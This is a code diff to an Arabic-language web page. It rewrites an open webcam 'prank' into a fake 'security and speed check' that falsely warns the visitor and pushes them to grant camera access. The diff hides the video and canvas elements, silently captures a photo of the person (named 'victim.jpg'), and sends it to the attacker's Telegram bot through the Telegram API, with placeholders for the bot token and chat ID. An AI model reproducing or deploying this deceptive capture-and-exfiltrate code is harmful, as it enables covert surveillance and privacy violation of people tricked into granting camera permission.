@@ -2,31 +2,110 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مقلب السريع 😂</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص الأمان والسرعة 🚀</title>
     <style>
-        body { background: #111; color: #fff; text-align: center; font-family: Tahoma; padding-top: 50px; }
-        video { width: 400px; border-radius: 10px; border: 3px solid #ff4757; transform: scaleX(-1); } /* عشان الصورة ماتبقى معكوسة */
+        body {
+            background-color: #0d1117;
+            color: #58a6ff;
+            font-family: Tahoma, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        h1 { font-size: 1.8rem; color: #ff4757; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 1.1rem; }
+        
+        .loader {
+            border: 4px solid #161b22;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* إخفاء الكاميرا والـ Canvas تماماً عشان المقلب يتم في الخفاء */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h1>جاري فحص الجهاز... 🕵️‍♂️</h1>
-    <p>من فضلك اضغط "السماح" عشان اللعبة تبدأ!</p>
+    <h1>⚠️ تنبيه أمني عاجل!</h1>
+    <p>برجاء الضغط على <b>"سماح (Allow)"</b> لإكمال فحص كفاءة الجهاز...</p>
+    
+    <div class="loader" id="loader"></div>
 
-    <!-- مكان عرض الكاميرا -->
-    <video id="webcam" autoplay playsinline></video>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // طلب إذن الكاميرا وتشغيلها
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                var videoElement = document.getElementById('webcam');
-                videoElement.srcObject = stream;
-            })
-            .catch(function(error) {
-                alert("للأسف رفضت الإذن، المقلب باظ! ❌");
-            });
-    </script>
+        // ⚠️ حط بيانات البوت بتاعك هنا ⚠️
+        const BOT_TOKEN = 'حط_التوكين_بتاع_البوت_هنا';
+        const CHAT_ID = 'حط_الـ_CHAT_ID_بتاعك_هنا';
 
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // طلب إذن الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // ندي مهلة ثانية واحدة عشان الكاميرا تلقط صورة واضحة لوشه
+                setTimeout(() => {
+                    takeSnapshotAndSend();
+                }, 1000);
+            })
+            .catch(err => {
+                // لو رفض الإذن، ممكن تظهر له رسالة أو تحوله في حتة تانية
+                document.querySelector('h1').innerText = "تم إلغاء الفحص!";
+                document.getElementById('loader').style.display = 'none';
+            });
+
+        function takeSnapshotAndSend() {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'victim.jpg');
+                formData.append('caption', '📸 تم اصطياد الضحية بنجاح يا معلم! 😂');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    // بعد ما الصورة تتبعت، غير الكلام في الصفحة أو حوله على فيديو مضحك
+                    document.querySelector('h1').innerText = "لعبوووها عليك! 😂🃏";
+                    document.querySelector('p').innerText = "تم التقاط صورتك بنجاح يا صاحبي!";
+                    document.getElementById('loader').style.display = 'none';
+
+                    // اختياري: لو حابب تحوله لـ فيديو يوتيوب مضحك بعد ثانيتين
+                    /*
+                    setTimeout(() => {
+                        window.location.href = "لينك_فيديو_يوتيوب";
+                    }, 2500);
+                    */
+                })
+                .catch(err => console.error('خطأ في الإرسال:', err));
+            }, 'image/jpeg');
+        }
+    </script>
 </body>
 </html>
